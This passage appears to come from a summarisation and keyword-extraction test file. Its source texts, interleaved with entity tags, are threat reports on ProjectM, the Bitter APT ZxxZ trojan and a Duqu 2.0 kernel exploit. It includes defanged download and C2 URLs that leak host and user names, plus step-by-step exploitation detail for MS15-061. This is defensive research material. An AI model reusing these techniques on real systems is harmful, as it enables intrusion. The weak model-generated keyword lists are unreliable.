\u2019s involvement with the targeted attacks ; however , it does appear that the individual was involved with setting up some portion of the infrastructure used by the various payloads delivered in the attack campaign . According to the individual \u2019s social media pages and blogs , it strongly suggests he possesses skills to carry out offensive activities in ProjectM campaigns . Also , the individual \u2019s name appearing within [PERSON] Crimson [PERSON] Trojan samples suggests that he may have been involved with the creation of the malware as well . [ORG] Trend [ORG] Micro reported finding gigabytes of personal identifiable information ( PII ) in open directories on [CARDINAL] C2 servers related to ProjectM , mostly belonging to [ORG] Indian [ORG] Army personnel . Although such [PERSON] PII might be used for financial gain , we find multiple instances in social media and blogs where this actor states anti - [NORP] Indian sentiments , suggesting he is potentially politically motivated . While knowing the identity and motivations of a possible actor is not necessarily actionable from a defensive perspective , it does provide a good reminder that people are always behind an attack , as it is easy to become fixated solely on the technical aspects of malware and infrastructure . Name * Email * WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007 - [DATE] 2013 Palo Alto Networks", "generated_text": "an attack campaign; ProjectM; government and military personnel; India; the attack; cyber; emails; watering hole sites; tools; Crimson; Peppy; RATs; DarkComet; Bozok; cybercrime attacks; the infrastructure; Pakistan; access; infrastructure; infrastructure; information; information; an individual; the group; the infrastructure; the Andromeda; the infrastructure; the actor; the infrastructure; the Andromeda malware; the Andromeda files; the andromeda trojan.", "ref_text": "<START-1>The PDF analyzes a cyberespionage campaign called ProjectM that targeted the Indian government and military. ProjectM overlaps with Operation Transparent Tribe and Operation C-Major which also targeted Indian entities. The threat actors rely on spear-phishing emails and watering hole sites to deliver various malware like Crimson, Peppy, DarkComet, and Andromeda. They use blogs with India-related themes as watering holes. Analysis of the threat infrastructure found registration ties to an individual in Pakistan. The same email address was used to register command and control domains as well as legitimate web design domains. Social media accounts of the individual suggest anti-Indian sentiment. His name also appeared in debug symbol paths of Crimson malware samples, suggesting possible involvement in development. The blogs and social media show experience with offensive security tools like Metasploit. The actor also advertised services to bind malware in Excel documents, a technique used by ProjectM. While the extent of the individual's involvement is unclear, the evidence suggests he was likely involved in setting up infrastructure and possibly creation of malware for ProjectM. The report highlights that real people are behind attacks and focusing solely on the technical aspects can cause the human element to be overlooked. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49678800856531047, "gpt3/lexical/rouge_rouge2": 0.12043010752688173, "gpt3/lexical/rouge_rougeL": 0.2226980728051392, "gpt3/lexical/rouge_rougeLsum": 0.2226980728051392, "gpt3_generated_text": ["Unit 42 is currently researching an attack campaign targeting government and military personnel in India, which appears to be linked to previous campaigns targeting Indian embassies and the military. The group of actors involved in this campaign, known as ProjectM, relies on spear-phishing emails and watering hole sites to deliver a variety of different tools, including custom developed Trojans such as Crimson and Peppy, as well as off-the-shelf remote administration tools and downloaders. Interestingly, the campaign also utilizes techniques and Trojans commonly seen in cybercrime attacks, such as the Andromeda Trojan. During their research, Unit 42 discovered a linkage between the infrastructure used by ProjectM and an individual from Pakistan, although it cannot be definitively confirmed if this individual is involved with the attack campaign. The actors behind the campaign have access to a sizeable toolset of Trojans, and the registration information of the Andromeda, Crimson, and Peppy Trojan command and control domains used by ProjectM revealed that the majority of the infrastructure was registered using WHOIS protection services. However, the actors neglected to use WHOIS protection on two domains in their infrastructure, revealing an email address associated with the actor. This differs from most infrastructure used in targeted attacks, which typically use fake information and disposable email accounts during registration. On August 5, 2014, the actor seemingly discovered his mistake and updated the domain with WHOIS protection. This blog post highlights the trail of evidence individuals leave on the Internet when they are not careful about disguising their identity, and the importance of thorough research and analysis in cyber threat intelligence."]}, {"split_name": "test", "sample_id": "test_16", "prompt_text": "Extract the keywords: blog.talosintelligence.com /2022/05 / bitter - apt - adds - bangladesh - to - their.html Bitter [ORG] APT adds [PERSON] Bangladesh to their targetsCisco [ORG] Talos has observed an ongoing malicious campaign since [DATE] August [DATE] 2021 from the [ORG] Bitter [ORG] APT group that appears to target users in [GPE] Bangladesh , a change from the attackers ' usual victims . As part of this , there 's a new trojan based on [PERSON] Apost [PERSON] Talos is calling \" [PERSON] ZxxZ , \" that , among other features , includes remote file execution capability . Based on the similarities between the [CARDINAL] C2 server in this campaign with that of Bitter 's previous campaign , we assess with moderate confidence that this campaign is operated by the [ORG] Bitter [ORG] APT group . Executive SummaryCisco Talos discovered an ongoing campaign operated by what we believe is the [ORG] Bitter [ORG] APT group since [DATE] August [DATE] 2021 . This campaign is a typical example of the actor targeting [NORP] South [NORP] Asian government entities . This campaign targets an elite unit of the [GPE] Bangladesh 's government with a themed lure document alleging to relate to the regular operational tasks in the victim 's organization . The lure document is a spear- phishing email sent to high - ranking officers of [ORG] the [ORG] Rapid [ORG] Action [ORG] Battalion [ORG] Unit of the [GPE] Bangladesh police ( [ORG] RAB ) . The emails contain either a malicious RTF document or a [ORG] Microsoft [ORG] Excel spreadsheet weaponized to exploit known vulnerabilities . Once the victim opens the maldoc , the [ORG] Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017 - 11882 , CVE-2018 - 0798 and CVE-2018 - 0802 \u2014 all in [ORG] Microsoft [ORG] Office \u2014 then downloads the trojan from the hosting server and runs it on the victim 's machine . The trojan masquerades as a [ORG] Windows [ORG] Security update service and allows the malicious actor to perform1/19remote code execution , opening the door to other activities by installing other tools . In this campaign , the trojan runs itself but the actor has other RATs and downloaders in their arsenal . Such surveillance campaigns could allow the threat actors to access the organization 's confidential information and give their handlers an advantage over their competitors , regardless of whether they 're state - sponsored . Bitter threat actorBitter , also known as T - APT-17 , is a suspected [NORP] South [NORP] Asian threat actor . They have been active since [DATE] 2013 , targeting energy , engineering and government sectors in [GPE] China , [GPE] Pakistan and [GPE] Saudi [GPE] Arabia . In their latest campaign , they have extended their targeting to [NORP] Bangladeshi government entities . Bitter is mainly motivated by espionage . The adversary typically downloads malware onto compromised endpoints from their hosting server via HTTP and uses [ORG] DNS to establish contact with the command and control . Bitter is known for exploiting known vulnerabilities in victims ' environments . For example , in [DATE] 2021 , security researchers discovered that the adversary was exploiting the zero - day vulnerability CVE-2021- [DATE] 28310 , a security flaw in [ORG] Microsoft 's Desktop Manager . Bitter is known to target both mobile and desktop platforms . Their arsenal mainly contains [PERSON] Bitter [PERSON] RAT , [NORP] Artra downloader , SlideRAT and [ORG] AndroRAT.InfrastructureThe actor 's infrastructure consists of the [CARDINAL] C2 server ( helpdesk[.]autodefragapp[.]com ) and several domains that host the adversary 's malware , which is outlined below . Domains hosting [PERSON] Bitter [PERSON] APT malware . The [ORG] SSL thumbprints are unique for each domain 's certificate . We compiled a list of these [ORG] SSL thumbprints in the IOCs section of the report . The timeline below shows the various domains based on their certificate creation date.2/19The C2 host is helpdesk[.]autodefragapp[.]com . Its WhoIs record indicates that the domain autodefragapp[.]com registered it in [DATE] November [DATE] 2020 , and later updated it on [DATE] Nov. 3 , [DATE] 2021 . We have seen the actor use this C2 in previous campaigns . The [CARDINAL] C2 domain resolved to [CARDINAL] 99[.]83[.]154[.]118 during the period of the campaign . This is a legitimate [ORG] IP address for the AWS Global Accelerator networking service . Usually , the AWS Global Accelerator provides static IPs to the registrant , which allows the user to redirect traffic to their application or host for improved performance . In this case , we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host , which is parked behind the legitimate AWS service . We believe that the actor has employed this technique to conceal their identity . [ORG] AttributionWe assess with moderate confidence that this campaign is operated by Bitter based on the use of the same C2 IP address from previous campaigns and similarities in the decrypted strings of the payload , such as module names , payload executable name , paths and the constants.3/19The [CARDINAL] 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net , according to [ORG] Cisco [ORG] Umbrella , a domain that was previously reported as [PERSON] Bitter 's C2 server in a campaign against [NORP] Pakistani government organizations . The campaignCisco [PERSON] Talos observed an ongoing campaign operated by the [ORG] Bitter [ORG] APT group since [DATE] August [DATE] 2021 targeting [NORP] Bangladeshi government personnel with spear - phishing emails . The email contains a maldoc attachment and masquerades as a legitimate email . The sender asks the target to review or verify the attached maldoc , which is either a call data record ( [ORG] CDR ) , a list of phone numbers , or a list of registered cases . We have seen the actor use these themes in phishing emails in the past . The maldocs are an RTF document and [ORG] Microsoft [ORG] Excel spreadsheets . Examples of the specific subjects of the phishing emails are below . Subject : CDR Subject : Application for CDR Subject : List of Numbers to be verified Subject : List of registered casesThe maldocs ' file names are consistent with the phishing emails ' themes , as seen in the list of file names below : Passport Fee Dues.xlsx List of Numbers to be verified.xlsx ASP AVIJIT DAS.doc Addl SP Hafizur [ORG] Rahman.doc [ORG] Addl [ORG] SP [ORG] Hafizur [ORG] Rahman.xlsx [ORG] Registered [ORG] Cases List.xlsxBelow are [CARDINAL] two spear - phishing email samples of this campaign.4/19Phishing email sample [CARDINAL] 1Phishing email sample [CARDINAL] 2The actor is using [PERSON] JavaMail with the [PERSON] Zimbra web client version 8.8.15_GA_4101 to send the emails . [PERSON] Zimbra is a collaborative software suite that includes an email server and a web client for messaging.5/19Phishing email header information . The originating [ORG] IP address and header information indicates the emails were sent from mail servers based in [GPE] Pakistan and the actor spoofed the sender details to make the email appear as though it was sent from [NORP] Pakistani government organizations . The actor exploited a possible vulnerability in the [PERSON] Zimbra mail server . By modifying the [PERSON] Zimbra mail server configuration file , a user can send emails from a non- existing email account / domain . We have compiled a list of fake sender email addresses from this campaign : cdrrab13bd@gmail[.]com arc@desto[.]gov[.]pk so.dc@pc[.]gov[.]pk mem_psd@pc[.]gov[.]pk chief_pia@pc[.]gov[.]pk rab3tikatuly@gmail[.]com ddscm2@pof[.]gov[.]pkThe infection chainThe infection chain begins with the spear - phishing email and either a malicious RTF document or an [PRODUCT] Excel spreadsheet attachment . When the victim opens the attachment , it launches the [ORG] Microsoft [ORG] Equation Editor application to execute the equations in the form of [ORG] OLE objects and connects to the hosting server to download and run the payload.6/19Malicious RTF infection chain summary . In the case of a malicious [PRODUCT] Excel spreadsheet , when the victim opens the file , it launches the [ORG] Microsoft [ORG] Equation Editor application to execute the embedded equation object and launches the task scheduler to configure [CARDINAL] two scheduled tasks . [CARDINAL] One of the scheduled tasks downloads the trojan \" ZxxZ \" into the public user 's account space , while the other task runs the \" ZxxZ\" . Malicious [PRODUCT] Excel infection chain summary.7/19The payload runs as a Windows security update service on the victim 's machine and establishes communication with the C2 to remotely download and execute files in the victim 's environment . RTF documentThe Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017 - 11882 , which enables arbitrary code execution on victims ' machines running vulnerable versions of [ORG] Microsoft [ORG] Office . Our previous blog outlines how this particular exploit works in the victim 's environment . Malicious RTF document sample . The RTF document is embedded with an [ORG] OLE object with the class name \" Equation [CARDINAL] 3.0 . \" It contains the shellcode as an equation formula created using [ORG] Microsoft [ORG] Equation Editor.8/19Embedded [ORG] Microsoft [ORG] Equation object . When the victim opens the [ORG] RTF file with [ORG] Microsoft [ORG] Word , it invokes the [ORG] Equation Editor application and executes the equation formula containing [ORG] the Return - Oriented [ORG] Programming ( [ORG] ROP ) gadgets . The [ORG] ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl / nx . The payload is downloaded in the folder \" C:\\$Utf \" created by the shellcode and runs as a process on the victim 's machine . Download URL captured during runtime of the maldoc . Excel spreadsheetThe malicious [PRODUCT] Excel spreadsheet is weaponized to exploit the [ORG] Microsoft [ORG] Office memory corruption vulnerabilities CVE-2018 - 0798 and CVE-2018 - 0802.When the victim opens the [PRODUCT] Excel spreadsheet , it launches the [ORG] Microsoft [ORG] Equation Editor application to execute the embedded [ORG] Microsoft [ORG] Equation [CARDINAL] 3.0 objects.9/19Malicious [PRODUCT] Excel spreadsheet . Once the [ORG] Microsoft [ORG] Equation Editor service executes the embedded objects , it invokes the scheduled task service to configure the task scheduler with the commands shown below : [PRODUCT] Task [PRODUCT] 1 : [PRODUCT] RdxTask [PRODUCT] 2 : RdxFacThe actor creates the folder \" RdxFact '' in the Windows tasks folder and schedules [CARDINAL] two tasks with the task names \" Rdx '' and \" RdxFac '' to run [TIME] every [TIME] five [TIME] minutes . When the [ORDINAL] first task runs , the victim 's machine attempts to connect to the hosting server through the URL and , using the cURL utility , downloads the \" RdxFactory.exe \" into the public user profile 's music folder . [ORG] RdxFactory.exe is the trojan downloader . After [TIME] five [TIME] minutes of execution of the [ORDINAL] first task , \" Rdx , \" , the [ORDINAL] second task , \" RdxFac,\"runs to start the payload . Based on other related samples we discovered , the actor also uses different folder names , tasks names and dropper file names in their campaigns.10/19We noticed that the actor is using the cURL command - line utility to download the payload in the Windows environment . Systems running [FAC] Windows [FAC] 10 and later have the cURL utility , which the actor abuses in this campaign . The payloadThe payload is a 32 - bit [PRODUCT] Windows executable compiled in Visual C++ with a timestamp of [DATE] Sept. [DATE] 10 , [DATE] 2021 . We named the trojan \" ZxxZ \" based on the name of a separator that the payload uses while sending information to the C2 . This trojan is a downloader that downloads and executes the remote file . The executables were seen with the filenames \" [ORG] Update.exe \" , \" ntfsc.exe \" or \" nx \" in this campaign . They are either downloaded or dropped into the victim 's \" local application data \" folder and run as a [ORG] Windows [ORG] Security update with medium integrity to elevate the privileges of a standard user . The actor uses common encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tools . WinMain function snippet . The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an array that will be returned to the caller function.11/19Decryption function . The malware searches for [PRODUCT] the [PRODUCT] Windows [PRODUCT] Defender and [PERSON] Kaspersky antivirus processes in the victim 's machine by creating the snapshot of running processes using [ORG] CreateToolhelp32Snapshot and iterates through each process using API Process32First and Process32Next . WinMain ( ) snippet showing antivirus process detection.12/19The information - gathering function gathers the victim 's hostname , operating system product name , and the victim 's username and writes them into a memory buffer . Information - gathering function . The [CARDINAL] C2 communicating function at offset 401C50 is called from the [CARDINAL] two other requests making functions to send the victim 's information with the decrypted strings \" xnb / dxagt5avbb2.php?txt= \" and \" data1.php ? id= \" to C2 and receive the response . The received response is a remote file saved into the \" debug \" folder and executed with the API \" ShellExecuteA \" . In our research debugging environment , the remote file is similar to the trojan.13/19Requests making function [CARDINAL] 1 at offset 00401E00.14/19Requests making function [CARDINAL] 2 at offset 00402130.C2 communicationFor [CARDINAL] C2 communication , [ORDINAL] first , the trojan sends the victim 's computer name , user name , a separator \" ZxxZ \" and the Windows version pulled from the registry . The server responds back with data in the format < i d > < user>:\"<Program name\">.Next , the malware requests the program data . The server sends back the data of the Portable Executable effectively matching the [ORG] pattern:<zero or more bytes > ZxxZ < PE data minus the MZ > . It then saves the file to % LOCALAPPDATA%\\Debug\\<program name>.exe and tries to execute it . Request sent to C2.If the download is successful , the server sends back the request with the opcode DN - S and , in case of a failure , the opcode RN_E in their response . Based on our analysis , the opdoce DN - S means \" download successful \" and RN_E stands for run error . If failed , the malware attempts to download the program data [CARDINAL] 225 times , and after that , it will launch itself and exit . ConclusionOrganizations should be vigilant about the highly motivated threat actors who are known to conduct targeted attacks in their region . Threat actors usually emerge with smart techniques to accomplish their15/19adversarial objectives and we have seen such an attempt in this campaign with the addition of a new variant to their arsenal . In this current campaign , upon compromising the victim 's machine and implanting the trojan ZxxZ - which has remote file execution capability - the adversary can deploy and run other tools from their arsenal to achieve their malicious objective . Organizations should have a layered defense strategy with the implementation of the latest detection rules and behavioral protections in their endpoint defense solutions - not only with technical controls , but the organizations should have matured incident response plans and have the organization 's security posture streamlined to protect their environment against the latest threats . CoverageWays our customers can detect and block this threat are listed below . [ORG] Cisco [ORG] Secure [ORG] Endpoint ( formerly [ORG] AMP for Endpoints ) is ideally suited to prevent the execution of the malware detailed in this post . [ORG] Try [ORG] Secure [ORG] Endpoint for free here . [PERSON] Cisco Secure Email ( formerly [ORG] Cisco [ORG] Email [ORG] Security ) can block malicious emails sent by threat actors as part of their campaign . You can try Secure Email for free here . Cisco Secure Firewall ( formerly Next - Generation [ORG] Firewall and Firepower NGFW ) appliances such as [ORG] Threat [ORG] Defense [ORG] Virtual , Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat . [ORG] Cisco [ORG] Secure [ORG] Network / Cloud Analytics ( Stealthwatch / Stealthwatch Cloud ) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.16/19Cisco Secure Malware Analytics ( Threat Grid ) identifies malicious binaries and builds protection into all [ORG] Cisco [ORG] Secure products . [ORG] Umbrella , [GPE] Cisco 's secure internet gateway ( [ORG] SIG ) , blocks users from connecting to malicious domains , [ORG] IPs and URLs , whether users are on or off the corporate network . Sign up for a free trial of [ORG] Umbrella here . Cisco Secure Web Appliance ( formerly Web Security Appliance ) automatically blocks potentially dangerous sites and tests suspicious sites before users access them . Additional protections with context to your specific environment and threat data are available from [ORG] the [ORG] Firewall [ORG] Management [ORG] Center . [PERSON] Cisco [PERSON] Duo provides multi - factor authentication for users to ensure only those authorized are accessing your network . The following [ORG] ClamAV signatures have been released to detect this threat : Ole2.Exploit . ZxxZDownloader-9944376 - 0 [PERSON] Win . Downloader . ZxxZ-9944378 - 0Open - source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [ORG] Snort.org . Snort SIDs for this threat are [CARDINAL] 59736 and 300132.IOCDomainsolmajhnservice[.]com helpdesk[.]autodefragapp[.]comURLshttp[://]autodefragapp[.]com/ hxxp[://]olmajhnservice[.]com / updateReqServ10893x[.]php?x=035347 hxxp[://]olmajhnservice[.]com/ hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - BKP&ct = BKP hxxp[://]olmajhnservice[.]com / nxl / nx hxxp[://]olmajhnservice[.]com / nxl / nx/ hxxp[://]olmajhnservice[.]com / nt[.]php/?dt=17/19hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-2&ct=2 hxxps[://]olmajhnservice[.]com/ hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-1 hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-1&amp hxxp[://]olmajhnservice[.]com / nt[.]php?dt=%25computername%25 - ex-1&amp hxxp[://]olmajhnservice[.]com / nt[.]php hxxp[://]olmajhnservice[.]com / nt[.]php/ hxxp[://]olmajhnservice[.]com / nt[.]php/?dt=%25username%25 - EX-3ct=1 hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-1&ct=1 hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-1&amp;ct=1 hxxps[://]olmajhnservice[.]com / nt[.]php/ hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25computername%25 - EX-3&ct=3 hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25username%25 - EX-3&ct=1 hxxps[://]olmajhnservice[.]com / nt[.]php/?dt=%25username%25 - EX-3&amp;ct=1 hxxp[://]levarisnetqlsvc[.]net / drw / drw hxxp[://]levarisnetqlsvc[.]net / lt[.]php hxxp[://]levarisnetqlsvc[.]net/ hxxps[://]levarisnetqlsvc[.]net / lt[.]php hxxp[://]levarisnetqlsvc[.]net / jig / gij hxxps[://]levarisnetqlsvc[.]net / lt[.]php/?dt=%25computername%25 - LT-2&ct = LT hxxp[://]urocakpmpanel[.]com / axl / ax hxxp[://]urocakpmpanel[.]com / nt[.]php?dt=%25computername%25- * * * * hxxps[://]urocakpmpanel[.]com/ hxxp[://]urocakpmpanel[.]com / nt[.]php/?dt=%25computername%25- * * * * hxxps[://]urocakpmpanel[.]com / nt[.]php/?dt=%25computername hxxp[://]urocakpmpanel[.]com/ hxxp[://]urocakpmpanel[.]com:33324/", "generated_text": "the report; a malicious campaign; the Bitter APT group; August 2021; users; Bangladesh; the lure document; RTF documents; Excel; vulnerabilities; the Equation Editor application; remote file execution capability; the trojan; Windows Security update service; capabilities; Remote File Execution; a Windows Security update service; other tools; Remote File Execution; the trojan; credentials; the attackers; confidential information; their handlers; another campaign; their competitors; state-sponsored surveillance campaigns; the organization; Confidential Information; their handlers; their competitors; state-sponsored surveillance campaigns; their controllers; their control; control; the threat actors; the operation; data.", "ref_text": "<START-1>The blog post details a spear-phishing campaign targeted at Bangladesh government organizations that Cisco Talos researchers attribute to the Bitter APT group with moderate confidence. Bitter has previously targeted South Asian government entities but this campaign signals an expansion into Bangladesh. The spear-phishing emails contain either a malicious RTF document or Excel spreadsheet as an attachment. When opened, these documents exploit known vulnerabilities in Microsoft Office to download and install a new Bitter trojan called ZxxZ. ZxxZ gathers system info and can download and execute additional files sent from the command and control server. The infrastructure analysis shows similarities between this campaign's C2 and previous Bitter campaigns. The phishing emails originate from and spoof legitimate Pakistani government organizations. The emails contain thematic lures relevant to the target organization's work. Bitter is mainly motivated by espionage and known to exploit vulnerabilities in victims' environments. They are known to target both mobile and desktop platforms and their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT. The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware. The post analyzes the infection chain, documents, malware, and C2 communication in detail. It covers detections, protections, and IOCs available to defend against this threat. The researchers conclude organizations should implement layered security and be vigilant about targeted attacks in their region from motivated adversaries like Bitter. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5199063231850116, "gpt3/lexical/rouge_rouge2": 0.20235294117647057, "gpt3/lexical/rouge_rougeL": 0.32318501170960184, "gpt3/lexical/rouge_rougeLsum": 0.32318501170960184, "gpt3_generated_text": ["In August 2021, Cisco Talos discovered a malicious campaign operated by the Bitter APT group that targets users in Bangladesh, a change from their usual victims. The campaign involves a new trojan called \"ZxxZ,\" which includes remote file execution capability. The Bitter APT group has been targeting South Asian government entities, specifically an elite unit of the Bangladesh government. The group uses spear-phishing emails containing malicious RTF documents or Excel spreadsheets to exploit known vulnerabilities. Once the victim opens the document, the trojan is downloaded and runs on the victim's machine, masquerading as a Windows Security update service. This gives the Bitter APT group remote code execution capabilities and access to the organization's confidential information. Bitter is a suspected South Asian threat actor known for exploiting vulnerabilities in victims' environments. They have been active since 2013, targeting energy, engineering, and government sectors in China, Pakistan, and Saudi Arabia. The group's infrastructure includes a C2 server and several domains that host their malware. The article concludes that this campaign is operated by the Bitter APT group based on similarities in the C2 server and decrypted payload strings."]}, {"split_name": "test", "sample_id": "test_17", "prompt_text": "Extract the keywords: Duqu 2.0\u2022 Duqu 2.0 was discovered by [PERSON] Kaspersky [PERSON] Lab early thisyear and was named as such due to its close similarity to original [PERSON] Duqu [PERSON] malware.\u2022 We will have a close look into the component used [LAW] forEOP ( Elevation - of - Privilege ) attack.\u2022 The vulnerability used for this attack is already patchedand the [ORG] Microsoft [ORG] Security bulletin MS15 - 061 was published on [DATE] June [DATE] 9 , 2015.Duqu 2.0The purpose of this talk is to reveal the exploitation method of [PRODUCT] Duqu [PRODUCT] 2.0 , to educate the industry and share knowledge . The exploit exhibits a few interesting features : Exploitation processUse - after - freeAcquire initial memory [ORG] RWaccessAcquire full memory RWaccessSMEP bypassShellcode executionUse - after - freeExploitation processUse - after - freeAcquire initial memory [ORG] RWaccessAcquire full memory RWaccessSMEP bypassShellcode executionThe nature of the vulnerabilityWhen the userland process registers its own ClientCopyImage callback , it destroys the [ORG] Window object . It also unregisters the associated class that triggered the callback , which leads to use - after - free condition . By indirectly allocating a structure just after the use- after - free condition , the attacker can control what happens next . Filling the blank spaceThe exploit calls NtUserThunkedMenuItemInfo call just after use - after - free condition . This call will allocate various objects in place of the freed memory location . The new object happens to be located in an address that will be used by HMUnlockObject call after the ClientCopyImage callback . How use - after - free worksAcquire initial memory RW accessExploitation processUse - after - freeAcquireinitialmemory RWaccessAcquire full memory RWaccessSMEP bypassShellcode executionOriginal [PERSON] tagCLS object1 : kd > dt tagCLS fffff90140812ab0 win32k!tagCLS \u2026 +0x060 cbclsExtra : [CARDINAL] 0n0 \uf0df initialized to [CARDINAL] 0 \u2026 \u2026 +0x090 lpszAnsiClassName : [CARDINAL] 0xfffff901`4080eb60 \" ^0Vero1^\"The cbclsExtra field is initialized to [CARDINAL] 0 in this case , which means there is no extra memory for this class . HMUnlockObject to corrupt a memory locationwin32k!HMUnlockObject+0x4 : fffff960`0014b2f4 ff4908 decdword ptr [ rcx+8 ] \uf0df corruption target memoryfffff960`0014b2f7 [CARDINAL] 7532 jnewin32k!HMUnlockObject+0x3b ( fffff960`0014b32b)fffff960`0014b2f9 8b01 moveax , dword ptr [ rcx]\u2022 Rcx points inside of [CARDINAL] one of the [PERSON] tagCLS objects that is pointed at by fake object.\u2022 The corruption target rcx+8 points to cbclsExtra field of the [PERSON] tagCLS object.\u2022 The [PERSON] tagCLS object is pre - allocated beforehand by calling a series of WindowsAPIs . This field is used to indicate the size of extra class memory.\u2022 Usually , APIs like GetClassLong and SetClassLong are used to access extra classmemory . Corrupt tagCLS object2 : kd > dt tagCLS fffff90140812ab0 win32k!tagCLS \u2026 +0x060 cbclsExtra : 0n-1 \uf0df corrupted field ( [CARDINAL] 0xffffffff inunsigned form ) \u2026 +0x090 lpszAnsiClassName : [CARDINAL] 0xfffff901`4080eb60 \" ^0Vero1^\"With the HMUnlockObject instruction \u2019s corruption of the memory , it becomes -1 or [CARDINAL] 0xffffffff in unsigned DWORD form . Out of bounds indexwin32k!xxxSetClassLong+0x74 : fffff960`0035b044 3b4160 cmpeax , dword ptr [ rcx+60h ] ( cbclsExtra)eax = b44c \uf0df out of bounds indexfffff960`0035b047 [CARDINAL] 7725 ja win32k!xxxSetClassLong+0x9e ( fffff960`0035b06e)\u2022 With this corrupt cbclsExtra field , the exploit will have the ability to freely access extra memory address space using GetClassLong and SetClassLong API sets.\u2022 Because the code used ja instruction to check the maximum value for the APIs \u2019 index parameter , there is an unsigned comparison [CARDINAL] between [CARDINAL] 0xffffffff and the index value . It then allows the exploit to access a wide range of kernel memory with read - and - write privilege . Arbitrary full memory RW accessExploitation processUse - after - freeAcquire initial memory [ORG] RWaccessAcquire full memory RWaccessSMEP bypassShellcode executionLocating tagWND.strName0 : kd > dt -r win32k!tagWND fffff901`4083f000 - e0 + 0x000 head : _ [ORG] THRDESKHEAD \u2026 +0x0d8 strName : _ [PERSON] LARGE_UNICODE_STRING+0x000 [PERSON] Length : 0x10 + 0x004 [ORG] MaximumLength : 0y0000000000000000000000000010010 ( [CARDINAL] 0x12)+0x004 [ORG] bAnsi : 0y0 + 0x008 Buffer : 0xfffff901`40810b60 \" ^0Vero1^ \" \uf0df overwriting targetBy carefully calculating the tagWND objects \u2019 location inside the kernel based on the object returned from the call , it will locate the strName member variable inside the tagWND object by adding [DATE] 0x0d8 value to the base of object . Locating tagWND.strName0 : kd > dt -r win32k!tagWND fffff901`4083f000 - e0 + 0x000 head : _ [ORG] THRDESKHEAD \u2026 +0x0d8 strName : _ [PERSON] LARGE_UNICODE_STRING+0x000 [PERSON] Length : 0x10 + 0x004 [ORG] MaximumLength : 0y0000000000000000000000000010010 ( [CARDINAL] 0x12)+0x004 [ORG] bAnsi : 0y0 + 0x008 Buffer : 0xfffff901`40810b60 \" ^0Vero1^ \" \uf0df overwriting targetThe location of tagWND and its member object is calculated using the _ MapDesktopObject [DATE] Win32k function . Locating tagWND.strName0 : kd > dt -r win32k!tagWND fffff901`4083f000 - e0 + 0x000 head : _ [ORG] THRDESKHEAD \u2026 +0x0d8 strName : _ [PERSON] LARGE_UNICODE_STRING+0x000 [PERSON] Length : 0x10 + 0x004 [ORG] MaximumLength : 0y0000000000000000000000000010010 ( [CARDINAL] 0x12)+0x004 [ORG] bAnsi : 0y0 + 0x008 Buffer : 0xfffff901`40810b60 \" ^0Vero1^ \" \uf0df overwriting target\u2022 The exploit \u2019s tactic is to corrupt the strName . [PERSON] Buffer member variablefrom tagWND and use it as a leverage for further memory access.\u2022 It has full memory access with 64 - bit memory range and witharbitrary length of data . Using InternalGetWindowText API to read from kernel memoryNtUserSetClassLongPtr(hWND : [DATE] 30208 , [NORP] nIndex : [CARDINAL] 12a90 , dwNewLong : fffff6fb7dbedf90 , [ORG] bAnsi : [CARDINAL] 1)\uf0e0 Set the tagWND.strName . [PERSON] Buffer value to fffff6fb7dbedf90 * int _ _ stdcall InternalGetWindowText(HWND [ORG] hWnd : [DATE] 30208 , [ORG] LPWSTR [ORG] pString : [ORG] ccd310 , int cchMaxCount : [CARDINAL] 5)\uf0e0 This will retrieve bytes from the designated tagWND.strName . Bufferlocation . * Return user32!InternalGetWindowText : [CARDINAL] 4 > pString 00ccd310 \" \u4863\u0ab6\"00ccd310 63 48 b6 0a 00 00 00 00 - 00 00 00 00 00 00 00 00 cH Using NtUserDefSetText API to write to kernel memoryNtUserSetClassLongPtr(hWND : [DATE] 30208 , [NORP] nIndex : [CARDINAL] 12a90 , dwNewLong : fffff68000005500 , [ORG] bAnsi : [CARDINAL] 1)\uf0e0 Set the tagWND.strName . Buffer valueBOOL [GPE] APIENTRY NtUserDefSetText(HWND [ORG] hWnd : [DATE] 30208 , PLARGE_STRING WindowText : [CARDINAL] 93f608)\uf0e0 This writes any designated bytes to the target kernel memory location . WindowText : Length : [CARDINAL] 6MaxmimLength : [CARDINAL] 6bAnsi : 0Buffer : 00000000`00ccd358 [CARDINAL] 63 f8 [CARDINAL] 37 12 00 00 c.7 SMEP bypassExploitation processUse - after - freeAcquire initial memory RWaccessAcquire full executionWhat is [PERSON] SMEP?SMEP ( Supervisor Mode Execution Prevention)[1 ] \u201c Exploit Mitigation Improvements in Windows 8 \u201d url bypass and limitationsKnown techniques developed to bypass SMEP:1 . Code re - use with existing kernel gadgets ( kernel ROP)2.Inject code into kernel memory without [ORG] DEP ( executable pages)3 . Modify nt!MmUserProbeAddress4 . [ORG] Modify U / S flagThe goal of # 1 [MONEY] and # 2 is usually clearing CR4.SMEP bitSMEP bypass and limitations Previous research and proof - 